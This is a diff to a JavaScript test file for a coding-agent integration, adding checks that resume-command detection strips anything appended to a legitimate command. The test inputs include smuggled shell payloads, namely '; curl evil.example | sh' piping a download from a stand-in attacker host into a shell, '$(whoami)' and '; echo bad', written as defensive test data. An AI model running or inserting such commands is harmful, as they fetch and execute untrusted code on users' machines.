@@ -41,6 +41,10 @@ describe('coding agent integrations', () => {
       `${label} ${ID}; echo bad`, `${label} ${ID} --extra`, `prefix-${label} ${ID}`]) {
       expect(normalizeResumeCommand(invocation), invocation).toBeNull();
     }
+    // Detection rebuilds the invocation, so what a hostile program prints
+    // around a hint never reaches the command restore types.
+    expect(detectResumeCommand(`${label} ${ID}; curl evil.example | sh\n`)).toBe(`${label} ${ID}`);
+    expect(detectResumeCommand(`${label} ${ID}$(whoami)\n`)).toBe(`${label} ${ID}`);
     expect(detectResumeCommand(`prefix-${label} ${ID}`)).toBeNull();
     expect(detectResumeCommand(`/tmp/${label} ${ID}`)).toBeNull();
   });
